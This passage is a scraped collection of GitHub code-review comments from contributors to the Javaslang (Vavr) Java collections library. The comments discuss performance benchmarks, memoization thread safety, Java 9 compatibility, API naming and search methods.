shouldNarrowPrimitives() {\n    final Vector<Object> object = Vector.narrow(range(0, 2));\n    Vector<Object> actual = object.append(\"String\");\n    assertThat(actual).isEqualTo(of(0, 1, \"String\"));\n}\n(added this test explicitly now. shouldBehaveLikeArray already tested this implicitly)\n\narrayType.isPrimitive() && (element == null || !arrayType.isPrimitive());\n\nA & (B | !A) == A && B, since !A is always false (typo?)\n\nlet me know if you still prefer to change this\n. spacing ...\n. Uff, I don't understand what you mean by file system in this context.\nAlso, I can't easily make the methods in ObjectArrayType static :/\nSuggestions?\n. I wanted to separate the primitive types from the only non-primitive type.\nWould you like me to merge the nested ifs instead?\n. If you still think I should, I will, just let me know if it's still the case (see my other responses)\n. JMH shows that the if/else version is ~5% faster, thanks :)\n. I thought about it, but if the iterable is TraversableOnce, I would consume it for the size, right?\n. Fixed it in a separate commit, thanks :)\n. Renamed all to type for brevity :)\n. yeah, trying to achieve a good signal-to-noise ratio in a language that doesn't want me to :)\n. 1.  I don't mind if the benchmark correctness tests (e.g. that prependAll concats to the start and not the end, i.e. that's I'm testing the speed of the correct thing) run only on the CI, an not locally.\n2. The property based tests are incredibly useful. I have made them quicker now, they all run in 7 seconds :)\n3. same as 1.\n4. we could simply try parallel tests, as we're basically stateless, everything should work out of the box\n. Mostly done - and pushed -, not sure about embedding them to the same file, though.\nWhat's the advantage exactly, are we trying to simulate a sealed trait in Java this way?\nPushed most of the changes, if it's easier for you to merge-and-modify rather than explain further, I won't mind :)\n. I could BitMappedTrie<T> extends ObjectArrayType to get rid of the obj()s, the end result would be cleaner, but it would be kinda' hacky :/ \n. There are still tests that are traversableonce ... Are you suggesting that I simply ignore it (and delete the tests that rely on it?)\n. can it? :/\n. It is, but where do we convert it to a TraversableAgain, if you want to delete the asTraversableAgain method? If I just ignore those, I need to fix the tests, as I've done for Euler67Test\n. The iterable that's returned by the test is not an instance of Iterator, it's some anonymous lambda (I think a Stream is converted to an iterator).\nI don't think we can consume it twice, I recommend reverting it to\njava\nif (iterable instanceof Collection<?>) {\n    final Collection<? extends T> collection = (Collection<? extends T>) iterable;\n    return collection.toArray();\n} else {\n    final Traversable<T> traversable = asTraversableAgain(iterable);\n    return asArray(traversable.iterator(), traversable.size());\n}\n. I have reverted the test, but I needed to wrap the general Iterable to a List, otherwise I might not be able to go over it multiple times (e.g. it might be a Stream, that won't return the same iterator multiple times)\n. now that we have ArrayType, we can create this without reflection (making it GWT compatible also).\nWould be neat if you could JMH both, as it may also be faster than reflection :)\n. Meh, you're right, it's not applicable in this particular case :/\n. the order matters, i.e. made \"Object\" the fallback\n. made it more typesafe\n. let's generate these also\n. managed to get rid of this by relying on the runtime to throw a ClassCastException, instead of checking every insertion for correctness (i.e. a null or String value in a primitive array)\n. this would result in a NPE instead ...\n. I tried my best, but if we want optimistic modification, this is our best shot, I think.\nMade it traversable-again so that we can start from scratch if we can't add the element (will get a ClassCastException); box it and try again.\n. created all these helpers to bridge the gap between the Java and Javaslang collections.\n. a single append is almost 3x slower than before, but the bulk operations (*all) are ~17x faster than before, making it faster than Scala\n. could finally get rid of these, increasing coverage :)\n. needed for 100% coverage :)\n. test adding from Java collections also\n. test adding from non-traversable-again aso\n. convert everything to a primitive int with 30% likelihood\n. hmm, these casts are ugly, but I could't come up with a better solution (except for chaining the methods, as I suggested earlier ... @ruslansennov, could you please react to that?)\nEdit: I was still composing this review, not sure why you were notified, @ruslansennov :p\n. @ruslansennov?\n. this is not a vararg to avoid https://docs.oracle.com/javase/tutorial/java/generics/nonReifiableVarargsType.html#heap_pollution, right?\nWe do have many of these, though, maybe it's ok in our case :)\n. in case you will keep these, consider creating a method t here also, just for the casts :)\n. minor: indentation\n. I think you could create a t here also, that creates a Tuple from an Entry\n. no empty check anymore, or were these duplicates?\n. @ruslansennov, @danieldietrich, I think this test shows us that we may need a more composable solution to be real-world-ready. @ruslansennov, could we solve this without trickery :)?\n. consider using map.apply(1) instead of map.getOrElse(1, 0)\n. @ruslansennov, sorry for repeating myself, I think you could make this more compact by reusing previous factory methods, i.e.:\njava\npublic static <K, V> HashMap<K, V> of(K k1, V v1, K k2, V v2, K k3, V v3, K k4, V v4) {\n    return of(k1, v1, k2, v2, k3, v3).put(k4, v4));\n. minor:\n- consider declaring the variables in their order of usage\n- it's weird to call a Queue list - though that's what the LinkedHashMap calls it also\n- Consider using the API shortcuts for HashMap.of, Queue.of and Tuple.of, i.e. \njava\nQueue(Tuple(k1, v1), Tuple(k2, v2));\n. in other places the params have JavaDoc also (I don't think they have value, though, but it seems inconsistent to me)\n. @ruslansennov, could you please react to my objections that you reject?\nIf my comments bother you and you don't find them helpful, I don't mind, but please let me know.\n. I just wanted to draw attention to the fact that this is a real-world problem, that others will have to solve also. If the tests indicate that something is awkward, we should listen to them.\n. :+1: \n. It's ok, it was just an idea, I don't mind either way :)\n. will change this, thanks :)\n. I think you can get rid of the System.out.println\n. same\n. same\n. Should be Synchronized with the Idea styles :)\n. final?\n. (d) -> can be d ->\n. could also be: RND = ThreadLocalRandom.current();\n. :+1: for using Vector here\n. please explain :/\n. Good idea to use a stack here instead of a Vector (which would require a size hint).\nI suggest you use pushAll instead of foldLeft:\njava\nList.<T> empty().pushAll(iterable).iterator();\n. hmmm, why wasn't a cast needed before?\n. it = iterator?\nif you want to use an abbreviation, please consider using iter, it's more commonly used for iterator\n. :+1: for using the new reverseIterator\n. Why do you need the .iterator() exactly, reverseIterator(traversable) should work also?\n. you're using a stack's iterator here (i.e. List is a Stack), which is basically a reverse iterator.\nIt's a better solution to the problem, than what I've written previously, i.e. create a Vector from it and traverse it backwards.. this is unrelated, right?. consider using a static import here also. consider using a static import here also. no more null checks?. it's a bit difficult to ignore all these unrelated changes :/. does this fix the Java 9 compilation issue?. hmmm, you've inlined isLessOrEqual?. would T extends Comparable<T> resolve the cast below?. @ashrko619 don't merge, rebase :) \nFrom Idea you can do that from the VCS -> Git -> rebase my github fork,  and solve the conflicts . Previously the Iterator was changed to a List anyway, at least now we're avoiding an instance creation. Also, it's quite possible that this is simply allocated on the stack, i.e. escape analysis.\nIf not, people can still use the bulk operation anyway, that's what it's for :).\n. I don't think we should try to predict these things, the JIT gods work in mysterious ways, it's the reason I'm always measuring.\nI think we can consider inlining to be for free in these cases, it's a simple jump, it's certainly not the bottleneck :)\n. Generally we could probably avoid some jumps if we put the more likely cases first, otherwise we could have a jump to the else statement and a return separately.\nBut than again, sometimes this is done automatically by JIT.\nHowever, humans work in that way also, i.e. they expect the more frequent cases to appear first.\nIf it bothers you, I can revert these.. we could, but it's pointing to a final local field already. Not sure what you mean, it's what ArrayList does also when it's full, it copies everything in amortized linear time.. Yeah, thanks, this was an accident :). You're right, let's revert this :/. or I could change it to new java.util.LinkedHashMap<>(source.isTraversableAgain() ? source.size() : 16), whichever you prefer :). Te build actually failed because of this. I've changed a few things, please advize!\nIt's very important that you're comfortable with these changes also! :)\nI think they make the code more readable also, otherwise I wouldn't have changed it.. minor: please reformat these, as you can see, in other places the @Override is on a separate line. :+1: for simple impl with mutable intermediary representation. instead of indexOf separately, consider using javaslang.collection.Traversable#containsAll instead :). I understand your motive, and I think containsAll is still primitive enough and would signal the intent a lot better to the users than separate `indexOfs, which don't signal directly that we're testing whether it has the same elements.\nHowever, indexOf and contains may be problematic in case of duplicates, so the cleanest way would be to sort-and-compare, i.e.\njava\nfinal Seq<Integer> original = of(1, 2, 3);\nfinal Seq<Integer> shuffled = original.shuffle();\nassertThat(original.sorted()).isEqualTo(shuffled.sorted());. Note, if you're quick, yours could be the 1000th merged PR ;). this formatting actually helps in the IDE: nothing to see here, all method are simply delegated!\nhttps://github.com/paplorinc/javaslang/blob/62915babab93ee2d7d0d0e0373bf3f435fb6d4ac/javaslang/src/main/java/javaslang/collection/Seq.java#L1160. ~~will need more tests in reality~~. Thank you @ruslansennov, I thought about it also.\nWe could certainly optimize it for e.g. Vector, but how should we implement the previous for a List?\n. I don't think that is possible without linear or quadratic worst case performance (i.e. imagine a reverse iteration). inlined manually, it was used only once. removed asserts from Vector as it's stable enough and it may hinder inlining, even if turned off :/. this separate optimization didn't have a big advantage, as the general case already covers it.. better separation: create a mutable one and convert it to persistent in separate steps. Added tests for each introduced method. @ruslansennov, @seanf, @danieldietrich, added separate listIterator to IndexedSeq :). @danieldietrich, this formatting makes it very easy to see that the logic is extremely simple: we're basically just delegating.\nIf everything would be on separate lines, we would lose this compactness.\nIf you don't agree, I will reformat it :). this is the old reverse iterator that uses the new listIterator. if we use unmodifiable, I don't think we need Java, since it's obviously referring to the Collections' method, as you also pointed out.\nIf we use immutable, we may need Java in the name also.\n\nor one thing, they aren't really immutable\n\nThanks to reflection and UNSAFE, nothing really is :). > Don't be too obsessed with formatting. We have a formatter, so just apply it and forget about formatting.\nRemoved custom formatting in a separate commit.\n\nThe API should be expressive and concise on its own, with 'default' formatting.\n\nI've put it in a separate commit so that you can decide which is more \"expressive and concise\".. @danieldietrich, I'm confused, please tell me what to do exactly.\nI presume I shouldn't just drop the new commit, because that state wasn't accepted previously either.. Fixed, Idea applied these automatically using the new formatter.. Moved it to JavaConverters. Sorry, I don't understand what got broken here.. Again, not sure what this means.. Done, thanks!. @danieldietrich, I modified a few things, please review everything. Done. Done. Done. as default for LinerarSeq? or you mean default to Set, not Seq, right?\nDone, moved.. Done. Done. Done. Done. Done. Done (you don't have to spell out every instance btw :), I understand the concept usually and can apply it if to every instance). Done. Done. Done. Done. Done. I don't think delegation was necessary in these cases, but I don't mind either.\nDo you like narrowing here, or do you prefer casts, as you suggested? (i.e. I'm not sure I understand why you commented the delegation to this method). we should provide a constant time converter, back to the Seq it was created from :). reverted. unrelated. only listIterator cares about the exact Seq type, hence the cast. package private Collection-to-Javaslang converter. should be named elements to be consistent with the rest of the Seqs. Fixed by delegating to the actual Java alternative (i.e. it's already a linear method that's called mainly for debugging purposes). starting from the end. yeah, better ideas :)?. Good point, will fix (or change it to TODO()). :+1: for reviewable.io :). same, will TODO() this for now, thanks. same. lemme' take a look, thanks :). both equals and hashCode are based on the elements which have a fixed order, therefore if two are equal (i.e. have the same elements in the same order), they will have the same hashCode.\nIn case of sets and maps it's more complicated, hence the TODO().\nThanks.. I think these should be renamed to elements too (and most other cases also). feel free to correct the rest of a Arrays too :). :+1: . This property only holds for iterable Ts, right?. should rather be something like:\njava\n    @Test\n    public void shouldTransposeIfSingleValued() {\n        final List<Integer> actual = of(0);\n        final List<List<Integer>> expected = of(of(0));\n        assertThat(actual.transpose()).isEqualTo(expected);\n    }. should rather be something like:\njava\n    @Test\n    public void shouldTransposeIfSingleValued() {\n        final Vector<Integer> actual = of(0);\n        final Vector<Vector<Integer>> expected = of(of(0));\n        assertThat(actual.transpose()).isEqualTo(expected);\n    }. Indeed, your version makes it obvious that the two iterate in opposite directions.\nWe also repeat the delegate.length - 1, which is a constant (the JVM might be smart enough to detect it, I don't know).\nYour example could be simplified further by inlining length: it might also be more optimal for the JVM to know that we go through the whole array (it could unroll the loop better, if it knows the size in advance), and using i and j in the declaration order:\njava\nfor (int i = 0, j = delegate.length - 1; i < delegate.length; i++, j--) {\n    arr[i] = delegate[j];\n}. If you think it's a bottleneck, we could create a JMH for it.\nIn my experience non-algorithmic complexity cannot be guessed without measurement! The JVM can simply eliminate it and reorder whatever it wishes, as long as the visible results are the same.. > The are things defined by the JVM spec that are crystal clear, e.g. heap vs. stack access.\nExcept that it's not :). Escape analysis can cheat and allocate objects on the stack, instead of the heap to unburdon the GC, see: https://docs.oracle.com/javase/8/docs/technotes/guides/vm/performance-enhancements-7.html#escapeAnalysis. I agree, we shouldn't optimize prematurely, for same complexity, start with the version that's more readable :). Not necessarily, I like your version also, I just wanted to point out that it may not be an optimization at all, it may even be slower, so we should either choose one, it because it looks better, or let's measure it and take that into consideration also. :). @danieldietrich, would you expect this to be isSameAs also?. :+1: awesome suite of tests!. it's a constant time operation, why do we want to avoid calling it? :)\nThe code got more complicated.. :+1: . :+1: for Seq, though you requested iterable: https://github.com/javaslang/javaslang/issues/1659. do we need the supressions for the other tests, if apparently they're not needed here :)?. How about rowMapper / columnMapper instead?. I agree that it's minor.\nThough map functions have a mapper function param also, factory would be too general, in my opinion.. > without having a default value this might be the better choice\nIn that case I guess this line was misunderstood :). > First storing s.th. and then retrieving it again makes no sense to me.\nBoth variants store and retrieve it via direct access memory (field vs array access, same thing).. the bug is in the input:\nhttps://en.wikipedia.org/wiki/Transpose\n\nIn linear algebra, the transpose of a matrix is an operator which flips a matrix over its diagonal\n\nIn incomplete matrix is not a matrix, which doesn't have a diagonal.\nIn my opinion these inputs should simply throw an exception (or return an Option). Good news: for regular matrices our debate is not valid anymore: you create the ArrayLists's for the first row (via e.g. a map function) and populate the rest via the get(columnIndex).\nI will quickly take a look at whether it's feasible :). Great idea!. Seems redundant, @danieldietrich ?. Done. @danieldietrich, could we decompose this to\njava\n(pivot, rest) -> rest.partition ...\n_ -> values\nsomehow :)?. Is there something for a general Seq instead :)?\n. Done. Thanks, done. simulating Scala's bulk prepend. validate against the old impl. ... is probably automatically vectorized, since it has the same speed as System.arraycopy. should be optimal for constructing it from array source ... what was I thinking wrapping this in an iterator :/. > All types could benefit if we change Value.toArray() instead\nGreat idea, applied your suggestion and it's still faster than before (see measurements above), and only slightly slower that the specialized impl (~10%)!. > and I think this will most probably not be the bottleneck of an application. \nFor operations that need a lot of mutations (e.g. sort), it's best to dump a persistent collection to an array, do the dew and construct the collection back. This needs optimized from and to array operations, hence this commit :). > We observe that an iterator() is not as performant as a visitor (because of the additional method calls, see Vector).\nthe visitor is mainly needed to avoid boxing in case of primitive storage, it's not necessarily faster than the optimized iterator (that traverses leafs also).\nIf you think we need an alternative visitor/iterator also, I think it should be part of a separate issue, your previous suggestion solved the generalization problem, I think :). this contains many speed improvements, including a few of mine :). they had 3 different styles, I've unified them.\nWould you like me to revert or to convert all to the same style?. @danieldietrich, is it ok like this :)?. is the method reference important here? If not, you could throw an exception, to make it clear that it's not called :). is there a symmetric test for this, i.e. left(1).getRight()?. * please make local variables final, it's how @danieldietrich prefers them :)\n* you could chose slightly simpler values, e.g. of(1)\n. this should be simplified, like the other one above it. I think you could inline these two.\nAlso, Either.right(1) could more simply be written as Right(1) (with static import to API). same, these two can be simplified and inlined. It is indeed, but doesn't it have too much baggage for such a simple test :)?. you can drop the assertThat part, just Right(1).getLeft();. @danieldietrich, @ruslansennov, how can we solve this properly?. http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ConcurrentHashMap.html#computeIfAbsent-K-java.util.function.Function-\n\nSome attempted update operations on this map by other threads may be blocked while computation is in progress, so the computation should be short and simple, and must not attempt to update any other mappings of this map.. Thank you @ruslansennov, good find indeed.\nUnfortunately however, using HashMap isn't safe either.\nIn Java 9 they added checks for concurrent modifications, i.e.\nhttp://download.java.net/java/jdk9/docs/api/java/util/HashMap.html#computeIfAbsent-K-java.util.function.Function-\nThe mapping function should not modify this map during computation.\nThis method will, on a best-effort basis, throw a ConcurrentModificationException if it is detected that the mapping function modifies this map during computation.. I thought about that also, but multi-threaded recursion overflows my brain :/\nI'm not sure how to do that safely and how to test it properly.\n@danieldietrich, do you?. @ruslansennov, @danieldietrich, @zsolt-donca, do you think something like\njava\nfinal Map<Tuple3<T1, T2, T3>, R> cache = new HashMap<>();\nreturn (Function3<T1, T2, T3, R> & Memoized) (t1, t2, t3) -> {\n    final Tuple3<T1, T2, T3> key = Tuple.of(t1, t2, t3);\n    if (cache.containsKey(key)) {\n        return cache.get(key);\n    } else {\n        synchronized (cache) {\n            if (cache.containsKey(key)) {\n                return cache.get(key);\n            } else {\n                final R value = apply(t1, t2, t3);\n                cache.put(key, value);\n                return value;\n            }\n        }\n    }\n};\nwould work?\n\nSeems to work correctly for all (recursive) tests, even on Java 9, but I don't think we have a complex enough test suite to be sure.\nAlso,  it's a pity that we cannot use ConcurrentHashMap because of the non-null value restriction.. Force pushed a new version, all tests seem to be passing now on Java 9 also (from Idea only, not yet from Maven).\nThanks for your help @ruslansennov, @zsolt-donca.\n@danieldietrich, do you think we should add more tests here?. > doesn't use any volatile variable\nNo, but it uses an effectively final variable, that's meant to avoid the need for local volatile ... (Shipilev would cry, seeing that we still don't understand this).\nHowever, I don't trust HashMap in a non synchronized environment either ... maybe I should avoid the double locking and just put everything in a syncronized block :/. Done, thanks.. new WeakHashMap<>(); to avoid memory leaks?\n@danieldietrich, @ruslansennov, @zsolt-donca?\n. :+1: for moving these. I think memory out of bounds exception is worse, but I'm ok with both :). You can revert this with the new impl :). does javaslang.collection.ArrayBenchmark#update show an improvement?. good call, this can save a double copy! :). You could try clone also:\njava\nfinal Object[] arr = delegate.clone();\n. There is actually a withSize optimization for this, feel free to use it:\njava\nprivate static <T> Object[] toArray(Iterable<T> elements) {\n    if (elements instanceof Array) {\n        final Array<T> array = (Array<T>) elements;\n        return array.delegate;\n    } else {\n        return withSize(elements).toArray();\n    }\n}. alignment. mkString generated garbage for some reason :/. 21 % 10 == 1 -> 1st was incorrect. these had to be added manually.\n@danieldietrich, shouldn't these be generated instead?. :+1: . this is a really funny solution :+1: \n@danieldietrich, if this fill with a supplier even useful?. this should rather be:\njava\n@SuppressWarnings({\"unchecked\", \"rawtypes\" }). I think it would be more rezistent to change via the general (warmed up) method, but I don't mind leaving it this way either.. :+1: . would <T, ?> also work, or just <T, Object>?. k, thanks. ... could also be a final substring append, but this is probably faster. Good idea indeed, let me see how quick that is :). ~~Hmm, it seems to me their version is buggy for cases when the repetition count is a power of 2.\nWill provide a PR for Guava also (luckly I didn't copy their impl, so I could compare it against mine).~~ false alarm, cannot reproduce it anymore :). Done. :+1: \nThis means the exact same instance of the comparator, not the same logic, right?\nSeems ok to me :). nice, could you share some benchmarks :)?. this seems very stateful, would it be possible to separate it into smaller, more focused methods?. this is true when count is 0, right?. could we separate the first from the rest somehow?\nIt's difficult for me to understand it if it's intertwined :). this will always return true, right?\nor did you mean filled == true? (in which case it needs some additional tests). :)) yeah, I rather wish if and switch and for were expressions.... :+1:, hasNext is very simple here, shouldn't really affect the speed :). ~~is List faster than Vector for this scenario?~~. * drop(...).take(...) seems like a slice\n* you could use appendAll also, it's more intuitive to start with the prefix (it's implemented via prependAll in List anyway). what's the difference here?. I see that, but why is it important? It's a constant. appendAll uses prependAll internally:\njava\n@Override\ndefault List<T> appendAll(Iterable<? extends T> elements) {\n    Objects.requireNonNull(elements, \"elements is null\");\n    return List.<T> ofAll(elements).prependAll(this);\n}. I don't know, but in every case it's a micro-optimization, I suggest we only change it if it's easier to understand, I really doubt you could measure any speed difference :). This could help you even more: https://rainymood.com. If you're lucky it will end up on the stack (i.e. escape analysis), you should measure the impact :)\nSeems more readable/maintainable though, that's more important for me personally.. I use it sometimes when the environment is noisy, it's very relaxing :D. JMH has some nice profiler addons and https://github.com/AdoptOpenJDK/jitwatch is also quite good for pure Java (couldn't use it for Scala though).\nLet me know if you need help.. ... yeah .... :+1: . isn't this a mutable datastructure?. but if it's mutable, can't we use a simple ArrayList in the background, instead of a linked list?\nEdit: are iterators supposed to be called from multi-threaded environments?. this seems very low level, is it a lot faster?. Hi! :)\nThanks, please format the source code according to our standards.. ... return {@code Option} of .... could also be a static Resource.of or rather Closable.of. for full coverage you may want to test this with InterruptedException or some other non-fatal exception.\nPlease see the coverage of Try after this commit for further details :). It's just my preference: please consider renaming to Closeable or TestAutoCloseable or DummyCloseable etc and provide a static of factory, as done in other places.\n. :+1: . It seems you have to choose between @sputnikci and @codecov-io complaining :p\nCould we open a @codecov-io issue instead of making the code uglier?. :+1: . :+1: . :+1: . wow :). thanks :). Yes, http://www.dictionary.com/browse/closeable. Could you please provide a more realistic use case?\nA convincing real-world example, where this new functionality is useful (i.e. no dummy values).\n(I don't decide anything, I'm just curious. @danieldietrich is the boss :smiley:). From what I understood, this is meant to use a provider without an Option wrapping, right?\n(using import static javaslang.API.*;)\njava\nOption(value).orElseOf(0);\nvs.\nOption(value).orElse(Some(0));\n@danieldietrich, do you think this simplifies things?. I can't believe we didn't see this typo before :)). If you separate these in another PR - so that it stays Java 8 & 9 compatible - I'm sure that will be merged :). \ud83d\udc4d for Scala update\n(code generation crashed otherwise anyway). i think this is a bug in both the JDK and in Idea, they report different things for every variation of the code. ~~instead of this I would recommend using the new canAccess method, something like:~~\njava\npublic void isNotInstantiable() {\n    try {\n        Assertions.assertThat(clazz.getDeclaredConstructor().canAccess(null)).isFalse();\n    } catch (NoSuchMethodException e) {\n        throw new AssertionError(\"no default constructor found\");\n    }\n}\nEdit: This isn't java 8 compatible, my mistake. @danieldietrich, tomorrow is the release date of JDK 9, this commit solves most of the compile problems (I basically recreated everything to validate it, good job, guys (there are two commiters, apparently).\nIf you could fix these (it's weird generics magic that I didn't have the courage to understand), we could get on the Java 9 wave(r).. An alternative suggestion that Idea accepts also:\njava\n@SuppressWarnings(\"Convert2MethodRef\") // TODO fixme on Java 9\npublic static <T> Lazy<Seq<T>> sequence(Iterable<? extends Lazy<? extends T>> values) {\n    Objects.requireNonNull(values, \"values is null\");\n    return Lazy.of(() -> Vector.ofAll(values).map(v -> v.get()));\n}. seems unrelated. It won't be merged this way, since it has to be Java 8 compatible also.. Is this still Java 8 compatible?\n@danieldietrich do we need a separate, modularized Java 9 release also?. 3.7.0 is already available and it solves the compiler exception also. The following seems to work:\njava\nCase($Cons($Some($(1)), $Cons($Some($(2.0)), $())),\n    (Some<Number> x, List<Option<Number>> xs) -> x + \"::\" + xs). why was this needed?. It's in a separate commit, because it's obviously not strictly related :)\nIt should be part of the project so that it is compile-time checked. I will disable the deployment, it's a valid concern.. Yeah, it's weird :/\nWe should probably open a bug for the JDK and for Idea. Yeah, except that it's not working in Java 9, different types are inferred for some reason.\nIf I specify it explicitly, as done here, it's working.\nNot sure how to fix it otherwise.. Checked it, since it has tests only, there's nothing to deploy.\nThe benchmark profile has a run config also, so it still has its purpose - though we can remove the duplicate modules part, thanks for the note! :). The problem is, this isn't an intOptionList, it's a numberOptionList. (I had to test this module for Java 9 compatibility also, that's why I modified this part also). this is needed because java.version is always 8, even if the selected JDK is 9. The JDK cannot compile to another bytecode version, giving a warning. This disables the warning, since we're only checking the build, not producing any artifacts.\n<java.version>1.8</java.version>. Dunno, man, this seems to randomly pass or fail on JDK 9. There's a wedding I should attend, instead I'm debugging this :p. The benchmarks aren't run during the build. Not even the assertions. just the compilation.\nThey are just part of the project, to make sure any refactoring is propagated there also.. darn ... could you take a look, it's hopeless (it just passed locally ...)?. @danieldietrich, it only compiles on Java 9 if we explicitly specify the types here. Is that still ok?. Interesting, lemme' check it, thank you! :). Cool idea @chb0github, applied it in https://github.com/vavr-io/vavr/pull/2112/commits/b5205538133f0ec732e2161bd5b5e5b38c35fa2b. Really good job @valery1707!\n@danieldietrich, should these be added to the code generator?. ",
    "chronodm": "Is there a reason LinkedHashSet doesn't override toLinkedSet() to return this?\nAnd is there a reason toLinkedSet() returns Set rather than LinkedHashSet?. No problem. I ran a quick test with Array.of(map.values()).map(t._2) and it was quite a bit faster, but making that copy might have memory implications we don't want.. It will be annoying to have to duplicate code that makes use of the similar methods, but I suppose that would still handle many use cases. Maybe some time around Java SE 15 we'll get proper structural typing.. I think there are subtle philosophical differences between Optional and Option. Optional starts from a universe of null pointers and tries to make it easier for functional programming to operate in that universe. Option starts from a universe of functional constructs and includes a bridge (Option.of) to get data out of that other universe.  \nVavr-native code shouldn't use null, and if you're talking to a non-Vavr-native library that's documented to return nulls (such as java.util.collection), Vavr's design encourages you to wrap it in Options; but Option isn't intended as a mechanism to prevent NullPointerExceptions.\nThe way to think about nullable code, I think, is a bit like unsafe in C# or Rust\u2014don't spend any more time there than you have to, be careful when you do and don\u2019t let the nulls escape into your \u201csafe\u201d core code.\nSome day, maybe @Nullable will be standardized and enforcable and magically applied to the whole compilation scope by static analysis, but until then, as they say in Python, \u201cexplicit is better than implicit\u201d. If you forget the Option.of call, that's a programming error that should fail fast.. P.S. Some interesting discussion of the history of Optional here, including links to mailing list archives where you can dig into the fights over \u201cwhy doesn't it behave like [various other Option implementations and Option-like things that all behave differently from one another, including Fugue's which, like Vavr's, was inspired by Scala]\u201d.\nIf you want to go down that rathole, the Loose Ends: Optional thread is particularly interesting.\n\nBut Guava Optional is not trying to be any of the things its detractors\nwant it to be. (I find Ben Hutchison's arrogant accusation of ignorance\nparticularly galling.) It is only an alternative -- a better alternative --\nto the practice of using null to signify a missing value, especially a\nmissing return value. Without it, users of an interface with methods that\ncan return null to signify \"no value\" can -- and do, repeatedly -- forget\nto check for nullity and find out about their mistake only at runtime, if\never. With it, users are forced to at least acknowledge the need to check\nfor a missing value. It can streamline the common cases of supplying a\ndefault value or, with Java 8 lambdas, an exception to throw when the value\nis missing.\nTim Peierls, 2013-06-04. \n",
    "netzwerg": "+1 for this issue.\nI am particularly keen on getting a ListView from an IndexedSeq, which would allow usage of java.util.Collections.binarySearch without memory overhead.\n. That would work well for my specific needs!\n. @danieldietrich +1 for not letting this block the 2.0.0 release\nBTW: I am really impressed by your tenacious & systematic way of addressing this issue, especially how you document your thoughts, findings, and progress!\n. I am not completely convinced yet, so just to be sure:\nYou're suggesting to call List.ofAll in order to get rid of the upper bound for slangNumbers, right? I am aware that this is safe & fast, but the readability suffers if you're doing this in real-world code.\nLooking at it from a different angle: I am in the process of convincing my dev team that Javaslang is awesome. One of many arguments is that we no longer need defensive copying upon construction, and here I come suggesting this \"fix\":\n``` java\nclass SimpleComposition {\nprivate final List<Number> numbers;\n\nprivate SimpleComposition(List<? extends Number> numbers) {\n    this.numbers = List.ofAll(numbers); // Smell \n}\n\nboolean contains(Number number) {\n    return numbers.contains(number);\n}\n\n}\n```\nThis doesn't feel 100% right...\nIt certainly is a good workaround until we have a proper contains though:\njava\nboolean contains(Number number) {\n  return List.ofAll(this.numbers).contains(number);\n}\n. Tx for your excellent explanation, @danieldietrich!\nIMHO, cast(...) sounds scary while safeCast(...) sounds suspicious :-) But in our case, the cast is not risky at all, so we don't want the method to sound scary.\nWhat about something along the lines of narrow(...)?\n. > We use narrow in the context of Monads/higher-kinded types. A second use case of the same keyword would be confusing.\nGood point...\nInspired by your links, confine or restrict could work?\nAnything with bound can be confusing because it blurs the intention i.e. it is no longer clear that we're going from ? extends T (wide) to T (narrow).\n. I like infer if it's on the RHS of an assignment, like in your example:\njava\nList<Number> numbers = List.infer(doubles);\nI prefer restrict in a method chain:\njava\nreturn List.restrict(doubles).contains(...);\nBut probably I am focusing too much on my use case...\nWhat about List.typeSafe(...)? Has a positive connotation and works for both.\n. I agree, once you are aware that Iterable is a functional interface, the method is unnecessary. But how to make people aware? Docs? Or maybe a cookbook or FAQ?\nSince Javaslang complements the JDK, going back and forth between the two must be as easy as possible.\n. Actually, binarySearch only makes sense for IndexedSeq, right? For LinearSeq it can only be a linearSearch.\nScala's Searching hides this distinction behind a search method.\n. I also like the second approach.\nFor the comparator variant, I would switch parameter order (to keep the signatures as close to Collections.binarySearch as possible).\nTo summarize:\njava\ninterface Seq<T> {\n    int search(T key);\n    int search(T key, Comparator<? super T> comparator);\n}\nWith default implementations in IndexedSeq (binary search) and a LinearSeq (linear search).\nRegarding return type: Would you stick to the JDK int approach or return a fancier type \u00e0 la Scala (SearchResult with Found(int) | InsertionPoint(int)?\nPS: You might want to rename the issue title to \"Add search to Seq\"\n. I would keep it as simple as possible, i.e. use an int with the same semantics as Collections.binarySearch (just like you described).\nThe SearchResult has a certain appeal, but only if the extra complexity brings something to the table in terms of usage. Off the top of my head:\njava\nList<Integer> list = List.of(1, 3, 5, 7);\nint elem = 4;\nlist.search(elem).\n        whenFound(foundIndex -> System.out.println(\"Found \" + foundIndex)).\n        whenAbsent(insertionPoint -> list.insert(insertionPoint, elem));\nWith implementations in the SearchResult interface:\n``` java\ndefault SearchResult whenFound(IntConsumer foundHandler) {\n    if (isFound()) {\n        foundHandler.accept(foundIndex());\n    }\n    return this;\n}\ndefault SearchResult whenAbsent(IntConsumer insertionHandler) {\n    if (!isFound()) {\n        insertionHandler.accept(insertionPoint());\n    }\n    return this;\n}\n```\nBut I would need to give this some more thought... Could Match be of any help here?\n. Yep, good point!\n\nLet's return an int :) That's not too bad!\n\n+1\n. I gave the binary search on IndexedSeq a first shot. If you would be interested in a PR, I could round it off with proper javadoc?\nThe actual implementation is taken straight from Collections.binarySearch. I additionally got rid of any code duplication (natural vs comparator variant) by abstracting over the midToCmp conversion.\nIMHO, offering binary search on IndexedSeq is more urgent than linear search on LinearSeq (where searching is inefficient O(n) anyway). Moreover, the linear search implementation cannot be copied straight from Collections.binarySearch (uses a ListIterator with previous). Thus a re-implementation probably needs some more thoughts and tests...\n. @danieldietrich Tx, but no, this is not urgent for me...\n. Wow, danke, das freut mich sehr! :-)\n. (Will re-create this with correct branch base)\n. Good catch!\nIt's a little embarrassing: I quickly thought of this but couldn't find an adequate interface, moved on, and forgot \u2013 IntUnaryOperator, what a stupid name?!\n. :+1: \n. ",
